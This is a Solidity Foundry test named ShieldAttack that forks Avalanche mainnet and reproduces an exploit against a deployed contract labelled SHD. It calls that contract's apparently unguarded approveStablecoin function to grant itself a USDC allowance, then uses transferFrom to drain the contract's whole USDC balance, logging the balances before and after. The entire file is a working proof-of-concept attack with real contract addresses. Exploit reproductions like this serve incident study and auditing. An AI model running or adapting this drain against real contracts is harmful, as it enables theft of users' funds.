// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// interface
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 vaule) external returns (bool success);
} 

interface IShield {
    function approveStablecoin(address _token, address _contract) external;
}

// address
address constant USDC = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;

address constant SHD = 0x7BDBB20985A703a171781C2448097C6844bc3D48;

contract ShieldAttack is Test {

    function setUp() public {
        vm.createSelectFork("https://avalanche.public-rpc.com", 24634311);

        vm.label(address(USDC), "USDC");
        vm.label(address(SHD), "SHD");
    }

    function balanceBefore() public view {
        console.log("Shield balance before:", IERC20(USDC).balanceOf(SHD));
        console.log("Attacker balance before:", IERC20(USDC).balanceOf(address(this)));
    }

    function balanceAfter() public view {
        console.log("Shield balance after:", IERC20(USDC).balanceOf(SHD));
        console.log("Attacker balance after:", IERC20(USDC).balanceOf(address(this)));
    }

    function test_withdrawFrom() public {
        balanceBefore();
        // approve
        IShield(SHD).approveStablecoin(USDC, address(this));
        
        uint256 vaule = IERC20(USDC).balanceOf(SHD);
        //withdraw all the USDC
        IERC20(USDC).transferFrom(SHD, address(this), vaule);
        balanceAfter();
    }
}